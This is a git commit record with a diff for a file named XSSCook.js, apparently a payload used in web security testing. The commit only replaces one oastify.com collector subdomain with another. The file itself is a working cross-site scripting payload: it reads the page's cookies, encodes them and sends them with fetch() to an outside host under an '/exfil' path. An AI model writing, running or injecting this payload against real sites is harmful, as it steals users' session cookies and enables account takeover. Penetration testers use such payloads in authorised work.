35a056b57b49d6c43005a6cafcba485304628989
gaze11e <117212620+gaze11e@users.noreply.github.com>
2024-06-25 12:37:48 -0400

    Update XSSCook.js

--- XSSCook.js
+++ XSSCook.js
@@ -1,3 +1,3 @@
 let cookie = document.cookie
 let encodedCookie = encodeURIComponent(cookie)
-fetch("https://bcrdg18kj6nvnl5gq4ff5t1xgomga5.oastify.com/exfil?data=" + encodedCookie)
+fetch("https://ra5ckmibs18p35les05onli6qxwokg85.oastify.com/exfil?data=" + encodedCookie)
